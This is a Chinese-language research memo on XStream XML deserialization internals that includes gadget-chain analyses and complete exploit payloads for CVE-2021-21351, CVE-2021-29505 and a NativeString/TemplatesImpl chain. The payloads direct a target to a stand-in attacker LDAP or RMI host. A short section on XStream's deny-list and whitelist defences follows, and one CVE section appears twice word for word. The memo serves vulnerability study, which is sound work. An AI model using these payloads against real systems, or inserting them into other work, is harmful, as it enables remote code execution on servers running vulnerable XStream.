## memo

- com.thoughtworks.xstream.core.TreeUnmarshaller
    - com.thoughtworks.xstream.core.AbstractReferenceUnmarshaller
        - com.thoughtworks.xstream.core.ReferenceByXPathUnmarshaller

#### 解析标签名对应的class 层层mapper结构 执行逻辑类Filter

`<map class="x.x.Xxx"或resolves-to="x.x.Xxx" reference="">` 从标签属性key的`resolves-to`和`class`中 解析classType属性 

CachingMapper解析 根据标签明map先查缓存 后检查预制标签名 对应class后附


DynamicProxyMapper解析 标签名=dynamic-proxy 代理会被解析为`com.thoughtworks.xstream.mapper.DynamicProxyMapper.DynamicProxy `

最后DefaultMapper返回`Class.forName("x.x.Xxx", initialize, classLoader)` 当为class是数组时，initialize=true

##### com.thoughtworks.xstream.mapper.SecurityMapper

维护`com.thoughtworks.xstream.mapper.SecurityMapper#permissions` 维护白名单 

> 研发一般会设置com.thoughtworks.xstream.security.AnyTypePermission 允许所有

#### 转化器

XStream 为每种类型配备一个转换器Converter 是`AbstractCollectionConverter`的子类

Converters实例在`new XStream()`内call`com.thoughtworks.xstream.XStream#setupConverters`

均实现接口方法`marshal`和`unmarshal `实际序列化操作

`AbstractReferenceUnmarshaller#convert` 调用具体Coverter的`marshal`和`unmarshal`方法

`<map class="x.x.Xxx"或resolves-to="x.x.Xxx" reference="">` 

维护`AbstractReferenceUnmarshaller#parentStack` 存储已处理标签 索引reference属性值决定 默认标签名
维护`AbstractReferenceUnmarshaller#values` 存储已经实例化对象 key=reference属性值

class为接口 预置对应的实现类 比如：

`"interface java.util.Map" -> "class java.util.HashMap"`

`"interface java.util.SortedSet" -> "class java.util.TreeSet"`

`DefaultConverterLookup#lookupConverterForType` 迭代查找class对应的转换器Converter


##### MapConverter 处理Map键值对集合 比如:Treemap hashtable hashmap linkmap

当XStream在反序列化时遇到与Map类型匹配的XML节点 就会委派给 `MapConverter `

一个map对象的xml数据类似:

```xml
<map> //对应hashMap
  <entry>
    <key>...</key>
    <value>...</value>
  </entry>
  ...
</map>
```

在1.4.x版本调用unsafe接口构造map实例对象:

`SunLimitedUnsafeReflectionProvider#newInstance`->`unsasun.misc.Unsafe#.allocateInstance(type)`

MapConverter会使用reader遍历所有子节点`<entry>`

递归解析`<entry class="x.a.B">`对应的Converter 创建实例

解析所有entry节点 调用`map.put(key, value);` 调用点:`MapConverter#putCurrentEntryIntoMap`

> 这里触发key.hashCode() 和 key.equals(k2) 是反序列化的开始



##### SerializableConverter 实现java序列化接口  

SerializableConverter模拟Java原生的序列化机制 必须在标签必须设置`serialization="custom"`属性

实例化: 模拟Java原生反序列化 通过调用目标class的第一个非序列化父类的无参构造函数 

SerializableConverter创建一个自定义的ObjectInputStream

实现`readFromStream` `readFieldsFromStream` `defaultReadObject`等方法 将XML中的数据包装成一个流 模拟原生二进制流 

这样调用目标class实现的`readObject()`时 能处理xml数据流

递归解析处理实例属性`convertAnother` 如:属性标注`serialization="custom"`且实现`readObject()`


在XML中 SerializableConverter生成的内容通常是一个包含Base64编码字符串的节点 如：

```xml
<object class="example.MyClass" serialization="custom">
  <byte-array>rO0ABXNyABRleGFtcGxlLk15Q2xhc3MAAAAAAAAAAQIAAHhw</byte-array>
</object>
```

##### ReflectionConverter 

优先级低 默认`Converter.canConvert`默认返回true

实例化通常使用` sun.misc.Unsafe `绕过构造函数

存在 `AbstractReflectionConverter#canAccess` 

##### PriorityQueueConverter

##### 对特定class的转换处理 如时间日期相关类 UUID格式 
##### 字符串处理StringBuilder Enum相关类 Pattern正则 StackTrace异常堆栈类 Throwable 
##### 反射相关Field Method Class类
##### 代理相关DynamicProxyConverter DynamicProxy
##### 文件类FileConverter File
##### 字节数组处理EncodedByteArrayConverter byte array

Base64Encoder.encode()
##### 集合类SingletonCollectionConverter list set
##### 处理去重CollectionConverter set集合类




#### 实例化

以第一个map标签为例 进入MapConverter逻辑
- 直接调用class.newInstance() 无参构造
- HierarchicalStreams 解析《entry》标签
- 解析map第一个entry的key对象 按标签名查class
- 例子使用`jdk.nashorn.internal.objects.NativeString` key去重回调`hashCode()`->`toString()`
- 按照Mapper逻辑 由DefaultMapper处理 class
- 对应Coverter ReflectionConverter 处理
- call `MapConverter#putCurrentEntryIntoMap` 依次解析key和value
    - call `ReflectionConverter#unmarshal` 创建一般class实例
    - call  `SerializableConverter` 创建序列化实例
    - 最后call HashMap.put(key,value)
    - 进而调用key.hashCode()

##### AbstractReflectionConverter 

ReflectionConverter和SerializableConverter是AbstractReflectionConverter的子类

负责实例化标签名class，在XStream实例化过程中调用`XStream.setupConverters`注册Coverter

注册Coverter会附带优先级属性int priority xstream反序列化时按优先级顺序 条件是符合Converter.canConver

ReflectionConverter优先级-20 SerializableConverte优先级-10

##### XStream.reflectionProvider属性

用于在ReflectionConverter和SerializableConverter中创建标签实例，XStream不同版本有差异

- 早期版本1.3.x PureJavaReflectionProvider
    - 先调用无参构造
    - 无默认构造函数 实现序列化接口则构建通用序列化data 调用readObject()获得实例
    - 构建通用序列化data只有基础结构 成功与否视目标类实现readObject()复杂程度
    - 既无无参构造也非序列化，报错
- 1.4.x PureJavaReflectionProvider SunLimitedUnsafeReflectionProvider
    - unsafe模块 实例化


```java
Caused by: com.thoughtworks.xstream.converters.reflection.ObjectAccessException: 
    Cannot construct jdk.nashorn.internal.objects.NativeString as it does not have a no-args constructor
	at com.thoughtworks.xstream.converters.reflection.PureJavaReflectionProvider.newInstance(PureJavaReflectionProvider.java:71)
	at com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter.instantiateNewInstance(AbstractReflectionConverter.java:308)
	at com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter.unmarshal(AbstractReflectionConverter.java:161)
	at com.thoughtworks.xstream.core.TreeUnmarshaller.convert(TreeUnmarshaller.java:82)
```

##### 一般实例化 v1.4.11 AbstractReflectionConverter#instantiateNewInstance

可以由resolves-to指定具体class
call `SunLimitedUnsafeReflectionProvider#newInstance`->`unsasun.misc.Unsafe#.allocateInstance(type)` 分配内存空间

> 早期版本默认call无参构造函数，没有则抛异常中断

##### 填充属性

迭代`<jdk.nashorn.internal.objects.NativeString>`标签的子标签

- 根据标签名获取声明属性 `PureJavaReflectionProvider#getFieldOrNull`
- 获取属性class对用的转换器Coverter 后实例化属性 迭代循环处理
- `ReflectionProvider#writeField` call unfase接口赋值
- 标签包含属性`serialization="custom"` 反射调用`readObject()` 
    - 自定义对象输入流`com.thoughtworks.xstream.core.util.CustomObjectInputStream`

## 利用1 入口map NativeString FilterIterator ImageIO$ContainsFilter


```java
NativeString.value
 → Base64Data.dataHandler
 → XmlDataSource.is
 → SequenceInputStream.e
 → MultiUIDefaultsEnumerator.iterator
 → FilterIterator (外层)
     ├─ iter → 另一个 FilterIterator (内层)
     │     ├─ iter → Collections.EmptyIterator
     │     └─ next → TemplatesImpl (含恶意字节码)
     └─ filter → ImageIO$ContainsFilter
           └─ method → 指向 TemplatesImpl.getOutputProperties()
```

- jdk.nashorn.internal.objects.NativeString.hashCode() -> `NativeString.value.toString()`
- com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.toString() -> Base64Data.get()
- Base64Data.get() -> Base64Data.dataHandler.getDataSource()
- `SequenceInputStream.e.read()` -> 
- com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource.getInputStream() -> java.io.SequenceInputStream.nextStream()
- `SequenceInputStream.nextStream()` -> javax.swing.MultiUIDefaults.MultiUIDefaultsEnumerator.nextElement()
- javax.swing.MultiUIDefaults.MultiUIDefaultsEnumerator.nextElement() -> MultiUIDefaultsEnumerator.iterator.next()
- javax.imageio.spi.FilterIterator.next() -> FilterIterator.advance() -> `FilterIterator.filter.filter()`
- `javax.imageio.ImageIO$ContainsFilter.filter()` -> `ImageIO$ContainsFilter.method.invoke()`


```xml
<map>
    <entry>
        <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                <dataHandler>
                    <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                        <is class="java.io.SequenceInputStream">
                            <e class="javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator">
                                <iterator class="javax.imageio.spi.FilterIterator">
                                    <iter class="javax.imageio.spi.FilterIterator">
                                        <iter class="java.util.Collections$EmptyIterator"/>
                                        <next class="org.apache.xalan.xsltc.trax.TemplatesImpl" serialization="custom">
                                            <org.apache.xalan.xsltc.trax.TemplatesImpl>
                                                <default>
                                                    <__indentNumber>0</__indentNumber>
                                                    <__transletIndex>-1</__transletIndex>
                                                    <__bytecodes>
                                                        <byte-array>%s</byte-array>
                                                        <byte-array>%s</byte-array>
                                                    </__bytecodes>
                                                    <__name>Pwnr</__name>
                                                </default>
                                                <boolean>false</boolean>
                                            </org.apache.xalan.xsltc.trax.TemplatesImpl>
                                        </next>
                                    </iter>
                                    <filter class="javax.imageio.ImageIO$ContainsFilter">
                                        <method>
                                            <class>org.apache.xalan.xsltc.trax.TemplatesImpl</class>
                                            <name>getOutputProperties</name>
                                            <parameter-types/>
                                        </method>
                                        <name>foo</name>
                                    </filter>
                                    <next class="string">foo</next>
                                </iterator>
                                <type>KEYS</type>
                            </e>
                            <in class="java.io.ByteArrayInputStream">
                                <buf></buf>
                                <pos>0</pos>
                                <mark>0</mark>
                                <count>0</count>
                            </in>
                        </is>
                        <consumed>false</consumed>
                    </dataSource>
                    <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
        </jdk.nashorn.internal.objects.NativeString>
        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
    </entry>
    <entry>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    </entry>
</map>
```

## CVE-2021-21351 入口sorted-set
 
1.4.15及之前版本黑名单存在缺陷 



XStream 反序列化`<sorted-set>` >实例化java.util.TreeSet 走TreeSetConverter

`<javax.naming.ldap.Rdn_-RdnEntry>`对应内部类`javax.naming.ldap.Rdn$RdnEntry`

向集合添加第一个`RdnEntry` 添加第二个 `RdnEntry` 时，触发` RdnEntry.compareTo(other)`

`RdnEntry.compareTo()`内比较 `value `字段 构造了两个`value`： 1.XRTreeFrag 2.XString 

TreeSet.putAll()触发比较逻辑:`RdnEntry(XString).compareTo(RdnEntry(XRTreeFrag))`

compareT内部触发:`RdnEntry.value(xstring).equals(RdnEntry.value(XRTreeFrag))`

xstring.equals内触发:`XRTreeFrag.toString()`->`XRTreeFrag.str()`

XRTreeFrag是适配器类 触发其内部引用的 `m_DTMXRTreeFrag.m_dtm` 成员的方法触发getter

这里的 `m_DTMXRTreeFrag.m_dtm` 被设置为 `SAX2DTM`

触发:`XRTreeFrag.str()`->`SAX2DTM.getStringValue()` 后续逻辑如下:

```java
getStringValue:1294, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)
_firstch:534, DTMDefaultBase (com.sun.org.apache.xml.internal.dtm.ref)
nextNode:814, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)
deliverMoreNodes:309, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)
parseSome:370, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)
setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)
connect:615, JdbcRowSetImpl (com.sun.rowset)
```



```xml
<sorted-set> //实例化java.util.TreeSet 走TreeSetConverter
  <javax.naming.ldap.Rdn_-RdnEntry> //set元素 两个RdnEntry对象 _-符号引用内部类
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>
      <m__DTMXRTreeFrag>
        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>
          <m__size>-10086</m__size>
          <m__mgrDefault>
            <__overrideDefaultParser>false</__overrideDefaultParser>
            <m__incremental>false</m__incremental>
            <m__source__location>false</m__source__location>
            <m__dtms>
              <null/>
            </m__dtms>
            <m__defaultHandler/>
          </m__mgrDefault>
          <m__shouldStripWS>false</m__shouldStripWS>
          <m__indexing>false</m__indexing>
          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>
            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
              <javax.sql.rowset.BaseRowSet>
                <default>
                  <concurrency>1008</concurrency>
                  <escapeProcessing>true</escapeProcessing>
                  <fetchDir>1000</fetchDir>
                  <fetchSize>0</fetchSize>
                  <isolation>2</isolation>
                  <maxFieldSize>0</maxFieldSize>
                  <maxRows>0</maxRows>
                  <queryTimeout>0</queryTimeout>
                  <readOnly>true</readOnly>
                  <rowSetType>1004</rowSetType>
                  <showDeleted>false</showDeleted>
                  <dataSource>ldap://java-chains-ip:50389/x</dataSource>
                  <listeners/>
                  <params/>
                </default>
              </javax.sql.rowset.BaseRowSet>
              <com.sun.rowset.JdbcRowSetImpl>
                <default/>
              </com.sun.rowset.JdbcRowSetImpl>
            </fPullParserConfig>
            <fConfigSetInput>
              <class>com.sun.rowset.JdbcRowSetImpl</class>
              <name>setAutoCommit</name>
              <parameter-types>
                <class>boolean</class>
              </parameter-types>
            </fConfigSetInput>
            <fConfigParse reference='../fConfigSetInput'/>
            <fParseInProgress>false</fParseInProgress>
          </m__incrementalSAXSource>
          <m__walker>
            <nextIsRaw>false</nextIsRaw>
          </m__walker>
          <m__endDocumentOccured>false</m__endDocumentOccured>
          <m__idAttributes/>
          <m__textPendingStart>-1</m__textPendingStart>
          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>
          <m__pastFirstElement>false</m__pastFirstElement>
        </m__dtm>
        <m__dtmIdentity>1</m__dtmIdentity>
      </m__DTMXRTreeFrag>
      <m__dtmRoot>1</m__dtmRoot>
      <m__allowRelease>false</m__allowRelease>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
      <m__obj class='string'>test</m__obj>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>
```

## CVE-2021-29505 入口 java.util.PriorityQueue

`serialization='custom'`触发java.util.PriorityQueue反序列化readObject()

触发元素比较 没有显示设置`Comparator` 调用实现了`Comparable`接口`RdnEntry`的`compareTo`方法

比较两个`RdnEntry`时 会调用第一个元素的 `value(XString).equals(value(Packet))`

触发`value(Packet).toString()` `Packet.toString` 触发附件迭代 

Packet 对象内部嵌套对象：

- message → `com.sun.xml.internal.ws.message.saaj.SAAJMessage`

- sm → `com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl`

- nullIter → `com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator`

- aliases → `com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl`

- candidates → `com.sun.jndi.rmi.registry.BindingEnumeration`

- ctx.registry → `sun.rmi.registry.RegistryImpl_Stub`(一个 RMI 存根，指向 evil-ip:1099)


> jdk小版本会报错不稳定 
> No such field com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator.aliases



```xml
<java.util.PriorityQueue serialization='custom'>
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
        </default>
        <int>3</int>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
                    <parsedMessage>true</parsedMessage>
                    <soapVersion>SOAP_11</soapVersion>
                    <bodyParts/>
                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
                        <attachmentsInitialized>false</attachmentsInitialized>
                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
                                    <names>
                                        <string>aa</string>
                                        <string>aa</string>
                                    </names>
                                    <ctx>
                                        <environment/>
                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                            <java.rmi.server.RemoteObject>
                                                <string>UnicastRef</string>
                                                <string>evil-ip</string>
                                                <int>1099</int>
                                                <long>0</long>
                                                <int>0</int>
                                                <long>0</long>
                                                <short>0</short>
                                                <boolean>false</boolean>
                                            </java.rmi.server.RemoteObject>
                                        </registry>
                                        <host>evil-ip</host>
                                        <port>1099</port>
                                    </ctx>
                                </candidates>
                            </aliases>
                        </nullIter>
                    </sm>
                </message>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

## xstream 防御策略

- 黑名单：禁止已知的危险类 

- 白名单：只允许指定的安全类 

- 类型限制：限制反序列化的类型层次或接口

- 安全框架：1.4.7 起内置 `SecurityMapper` 提供接口控制允许的类。

### 1.4.7 之前

无内置防御策略 默认允许任何类反序列化

### 1.4.7 - 1.4.10

黑名单防御为主 白名单策略默认全开放

引入安全框架：`com.thoughtworks.xstream.security.TypePermission`接口

通过`xstream.denyTypes()`建立初始黑名单:

```java
xstream.denyTypes(new String[]{ "javax.imageio.ImageIO$ContainsFilter" });
xstream.denyTypes(new Class[]{ 
    java.lang.ProcessBuilder.class, 
    java.beans.EventHandler.class, 
    java.lang.Void.class, 
    void.class 
});
```

ReflectionConverter直接禁用:

`ReflectionConverter`的`canConvert(Class type)`方法里增加了一个硬编码判断 拒绝:`java.beans.EventHandler`

### 1.4.11 - 1.4.18

继续完善黑名单 强制开发开启安全策略`setupDefaultSecurity()`

`setupDefaultSecurity()`提供基本白名单 如基本类型 String 集合类


## CVE-2021-21351 JNDI注入
 
1.4.15及之前版本黑名单存在缺陷 



XStream 反序列化`<sorted-set>` >实例化java.util.TreeSet 走TreeSetConverter

`<javax.naming.ldap.Rdn_-RdnEntry>`对应内部类`javax.naming.ldap.Rdn$RdnEntry`

向集合添加第一个`RdnEntry` 添加第二个 `RdnEntry` 时，触发` RdnEntry.compareTo(other)`

`RdnEntry.compareTo()`内比较 `value `字段 构造了两个`value`： 1.XRTreeFrag 2.XString 

TreeSet.putAll()触发比较逻辑:`RdnEntry(XString).compareTo(RdnEntry(XRTreeFrag))`

compareT内部触发:`RdnEntry.value(xstring).equals(RdnEntry.value(XRTreeFrag))`

xstring.equals内触发:`XRTreeFrag.toString()`->`XRTreeFrag.str()`

XRTreeFrag是适配器类 触发其内部引用的 `m_DTMXRTreeFrag.m_dtm` 成员的方法触发getter

这里的 `m_DTMXRTreeFrag.m_dtm` 被设置为 `SAX2DTM`

触发:`XRTreeFrag.str()`->`SAX2DTM.getStringValue()` 后续逻辑如下:

```java
getStringValue:1294, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)
_firstch:534, DTMDefaultBase (com.sun.org.apache.xml.internal.dtm.ref)
nextNode:814, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)
deliverMoreNodes:309, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)
parseSome:370, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)
setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)
connect:615, JdbcRowSetImpl (com.sun.rowset)
```



```xml
<sorted-set> //实例化java.util.TreeSet 走TreeSetConverter
  <javax.naming.ldap.Rdn_-RdnEntry> //set元素 两个RdnEntry对象 _-符号引用内部类
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>
      <m__DTMXRTreeFrag>
        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>
          <m__size>-10086</m__size>
          <m__mgrDefault>
            <__overrideDefaultParser>false</__overrideDefaultParser>
            <m__incremental>false</m__incremental>
            <m__source__location>false</m__source__location>
            <m__dtms>
              <null/>
            </m__dtms>
            <m__defaultHandler/>
          </m__mgrDefault>
          <m__shouldStripWS>false</m__shouldStripWS>
          <m__indexing>false</m__indexing>
          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>
            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
              <javax.sql.rowset.BaseRowSet>
                <default>
                  <concurrency>1008</concurrency>
                  <escapeProcessing>true</escapeProcessing>
                  <fetchDir>1000</fetchDir>
                  <fetchSize>0</fetchSize>
                  <isolation>2</isolation>
                  <maxFieldSize>0</maxFieldSize>
                  <maxRows>0</maxRows>
                  <queryTimeout>0</queryTimeout>
                  <readOnly>true</readOnly>
                  <rowSetType>1004</rowSetType>
                  <showDeleted>false</showDeleted>
                  <dataSource>ldap://java-chains-ip:50389/x</dataSource>
                  <listeners/>
                  <params/>
                </default>
              </javax.sql.rowset.BaseRowSet>
              <com.sun.rowset.JdbcRowSetImpl>
                <default/>
              </com.sun.rowset.JdbcRowSetImpl>
            </fPullParserConfig>
            <fConfigSetInput>
              <class>com.sun.rowset.JdbcRowSetImpl</class>
              <name>setAutoCommit</name>
              <parameter-types>
                <class>boolean</class>
              </parameter-types>
            </fConfigSetInput>
            <fConfigParse reference='../fConfigSetInput'/>
            <fParseInProgress>false</fParseInProgress>
          </m__incrementalSAXSource>
          <m__walker>
            <nextIsRaw>false</nextIsRaw>
          </m__walker>
          <m__endDocumentOccured>false</m__endDocumentOccured>
          <m__idAttributes/>
          <m__textPendingStart>-1</m__textPendingStart>
          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>
          <m__pastFirstElement>false</m__pastFirstElement>
        </m__dtm>
        <m__dtmIdentity>1</m__dtmIdentity>
      </m__DTMXRTreeFrag>
      <m__dtmRoot>1</m__dtmRoot>
      <m__allowRelease>false</m__allowRelease>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
      <m__obj class='string'>test</m__obj>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>
```


```json
"empty-list" -> "java.util.Collections$EmptyList"
"awt-text-attribute" -> "java.awt.font.TextAttribute"
"year" -> "java.time.Year"
"chrono-unit" -> "java.time.temporal.ChronoUnit"
"number" -> "java.lang.Number"
"enum-map" -> "java.util.EnumMap"
"path" -> "java.nio.file.Path"
"hashtable" -> "java.util.Hashtable"
"enum-set" -> "java.util.EnumSet"
"iso-field" -> "java.time.temporal.IsoFields$Field"
"local-time" -> "java.time.LocalTime"
"serialized-lambda" -> "java.lang.invoke.SerializedLambda"
"tree-map" -> "java.util.TreeMap"
"offset-date-time" -> "java.time.OffsetDateTime"
"period" -> "java.time.Period"
"thai-buddhist-era" -> "java.time.chrono.ThaiBuddhistEra"
"temporal-value-range" -> "java.time.temporal.ValueRange"
"method" -> "java.lang.reflect.Method"
"sql-timestamp" -> "java.sql.Timestamp"
"double" -> "java.lang.Double"
"byte" -> "java.lang.Byte"
"local-date-time" -> "java.time.LocalDateTime"
"iso-unit" -> "java.time.temporal.IsoFields$Unit"
"auth-subject" -> "javax.security.auth.Subject"
"concurrent-hash-map" -> "java.util.concurrent.ConcurrentHashMap"
"big-decimal" -> "java.math.BigDecimal"
"field" -> "java.lang.reflect.Field"
"local-date" -> "java.time.LocalDate"
"tree-set" -> "java.util.TreeSet"
"object" -> "java.lang.Object"
"charset" -> "java.nio.charset.Charset"
"awt-font" -> "java.awt.Font"
"long" -> "java.lang.Long"
"instant" -> "java.time.Instant"
"file" -> "java.io.File"
"day-of-week" -> "java.time.DayOfWeek"
"japanese-date" -> "java.time.chrono.JapaneseDate"
"week-fields" -> "java.time.temporal.WeekFields"
"vector" -> "java.util.Vector"
"currency" -> "java.util.Currency"
"map" -> "java.util.Map"
"sorted-set" -> "java.util.SortedSet"
"set" -> "java.util.Set"
"xml-duration" -> "javax.xml.datatype.Duration"
"bit-set" -> "java.util.BitSet"
"hijrah-date" -> "java.time.chrono.HijrahDate"
"uri" -> "java.net.URI"
"gregorian-calendar" -> "java.util.Calendar"
"url" -> "java.net.URL"
"char" -> "java.lang.Character"
"activation-data-flavor" -> "javax.activation.ActivationDataFlavor"
"chrono-field" -> "java.time.temporal.ChronoField"
"year-month" -> "java.time.YearMonth"
"date" -> "java.util.Date"
"singleton-set" -> "java.util.Collections$SingletonSet"
"zone-id" -> "java.time.ZoneId"
"string-builder" -> "java.lang.StringBuilder"
"japanese-era" -> "java.time.chrono.JapaneseEra"
"offset-time" -> "java.time.OffsetTime"
"chronology" -> "java.time.chrono.Chronology"
"awt-color" -> "java.awt.Color"
"float" -> "java.lang.Float"
"uuid" -> "java.util.UUID"
"offset-clock" -> "java.time.Clock$OffsetClock"
"linked-list" -> "java.util.LinkedList"
"empty-map" -> "java.util.Collections$EmptyMap"
"linked-hash-map" -> "java.util.LinkedHashMap"
"julian-field" -> "java.time.temporal.JulianFields$Field"
"linked-hash-set" -> "java.util.LinkedHashSet"
"minguo-era" -> "java.time.chrono.MinguoEra"
"constructor" -> "java.lang.reflect.Constructor"
"empty-set" -> "java.util.Collections$EmptySet"
"list" -> "java.util.List"
"sql-time" -> "java.sql.Time"
"entry" -> "java.util.Map$Entry"
"big-int" -> "java.math.BigInteger"
"null" -> "com.thoughtworks.xstream.mapper.Mapper$Null"
"month" -> "java.time.Month"
"thai-buddhist-date" -> "java.time.chrono.ThaiBuddhistDate"
"singleton-map" -> "java.util.Collections$SingletonMap"
"month-day" -> "java.time.MonthDay"
"java-class" -> "java.lang.Class"
"minguo-date" -> "java.time.chrono.MinguoDate"
"system-clock" -> "java.time.Clock$SystemClock"
"string" -> "java.lang.String"
"tick-clock" -> "java.time.Clock$TickClock"
"locale" -> "java.util.Locale"
"duration" -> "java.time.Duration"
"singleton-list" -> "java.util.Collections$SingletonList"
"trace" -> "java.lang.StackTraceElement"
"string-buffer" -> "java.lang.StringBuffer"
"int" -> "java.lang.Integer"
"zoned-date-time" -> "java.time.ZonedDateTime"
"boolean" -> "java.lang.Boolean"
"sql-date" -> "java.sql.Date"
"hijrah-era" -> "java.time.chrono.HijrahEra"
"short" -> "java.lang.Short"
"fixed-clock" -> "java.time.Clock$FixedClock"
"properties" -> "java.util.Properties"

```